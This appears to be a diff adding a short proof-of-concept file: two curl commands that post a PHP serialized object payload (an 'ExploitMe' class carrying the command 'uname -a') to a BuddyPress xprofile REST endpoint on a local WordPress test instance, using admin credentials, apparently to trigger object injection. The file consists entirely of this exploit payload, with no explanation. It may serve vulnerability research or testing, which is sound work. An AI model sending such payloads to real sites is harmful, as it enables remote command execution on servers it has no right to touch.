@@ -1,0 +1,14 @@
+curl -u admin:pass \
+  -X POST \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode 'value=a:1:{i:0;O:9:"ExploitMe":1:{s:3:"cmd";s:8:"uname -a";}}' \
+  'http://localhost:1337/wp-json/buddypress/v1/xprofile/1/data/1?context=edit'
+
+
+curl -u admin:pass \
+  -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{"value":"a:1:{i:0;O:9:\"ExploitMe\":1:{s:3:\"cmd\";s:8:\"uname -a\";}}"}' \
+  'http://localhost:1337/wp-json/buddypress/v1/xprofile/1/data/1?context=edit'
+
+
